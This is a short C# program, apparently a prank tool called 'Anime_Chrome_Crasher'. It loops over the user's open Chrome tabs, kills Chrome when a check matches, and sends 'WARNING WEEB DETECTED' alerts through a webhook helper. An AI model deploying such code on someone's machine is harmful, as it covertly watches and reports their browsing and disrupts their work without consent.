using System;

namespace Anime_Chrome_Crasher
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            WeebHook.SendMessage("Weeb detection started");
            FindWindows.Start();
            while (true)
            {
                if (FindWindows.GetChrome())
                {
                    if (FindWindows.CheckTabs())
                    {
                        FindWindows.killWindow("chrome");
                        WeebHook.SendMessage("WARNING WEEB DETECTED");
                    }
                }
            }
        }
    }
}